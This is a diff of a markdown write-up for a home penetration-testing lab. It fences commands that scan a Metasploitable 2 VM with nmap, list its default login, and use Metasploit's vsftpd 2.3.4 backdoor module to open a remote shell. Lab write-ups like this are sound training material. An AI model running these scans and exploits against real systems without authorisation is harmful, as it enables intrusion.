@@ -21,16 +21,17 @@ Both Kali Linux and Metasploitable 2 are configured to use a **Host-Only Adapter
 
 ### 🔐 Metasploitable Login
 
-Do:
-```markdown
-\`\`\`plaintext
+```bash
 Username: msfadmin
 Password: msfadmin
-\`\`\`
+```
+
 
 After identifying the IP of the Metasploitable VM using ifconfig, I performed a vulnerability scan using Nmap:
 
+```bash
 nmap -sS -sV -O 192.168.56.101
+```
 
 ✅ Flag Breakdown:
 	•	-sS : TCP SYN scan (stealthy and fast)
@@ -49,11 +50,13 @@ PORT     STATE SERVICE     VERSION
 
 Identified a vulnerable FTP service running vsftpd 2.3.4. Used Metasploit to exploit it and gain shell access:
 
+``` bash
 msfconsole
 search vsftpd
 use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOST 192.168.56.101
 exploit
+```
 
 ✅ Result: Opened a remote shell session with the target.
 
